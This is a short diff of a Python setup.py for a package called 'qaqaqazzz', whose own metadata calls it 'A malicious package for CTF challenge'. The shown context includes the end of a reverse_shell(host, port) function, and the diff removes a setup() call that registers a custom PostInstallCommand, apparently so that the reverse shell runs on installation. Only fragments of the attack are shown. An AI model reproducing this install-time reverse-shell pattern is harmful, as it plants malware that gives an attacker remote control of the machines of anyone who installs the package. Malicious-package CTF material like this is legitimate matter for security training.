@@ -29,17 +29,4 @@ def reverse_shell(host, port):
     except Exception as e:
         print("Failed to establish reverse shell. Error:", str(e))
 
-setup(
-    name='qaqaqazzz',
-    version='1.5',
-    author='Your Name',
-    author_email='your_email@example.com',
-    description='A malicious package for CTF challenge',
-    packages=['qaqaqazzz'],
-    install_requires=[
-        'requests',  # 举例：添加你需要的依赖项
-    ],
-    cmdclass={
-        'install': PostInstallCommand,
-    }
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                           
